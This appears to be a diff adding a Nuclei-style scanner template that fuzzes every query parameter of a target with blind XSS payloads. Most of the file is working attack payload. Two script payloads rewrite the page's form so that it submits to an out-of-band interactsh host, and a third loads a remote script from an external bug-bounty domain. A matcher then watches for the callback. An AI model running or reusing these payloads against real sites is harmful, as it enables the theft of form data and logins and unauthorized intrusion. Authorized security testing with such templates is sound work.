@@ -1,0 +1,34 @@
+id: xss-to-collaborator
+
+info:
+  name: Blind XSS Collaborator
+  author: reewardius
+  severity: medium
+  tags: fuzzing-xss,fuzzing-req
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      injection:
+      - "<script>x=document.querySelector('form');x.setAttribute('method','GET');x.setAttribute('action','http://{{interactsh-url}}/');</script>"
+      - "\"><script>x=document.querySelector('form');x.setAttribute('method','GET');x.setAttribute('action','http://{{interactsh-url}}/');</script>"
+      - \';\"/></textarea></script></script><script src="https://js.rip/bugbounty"></script>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "http"
+          - "dns"
+        condition: or
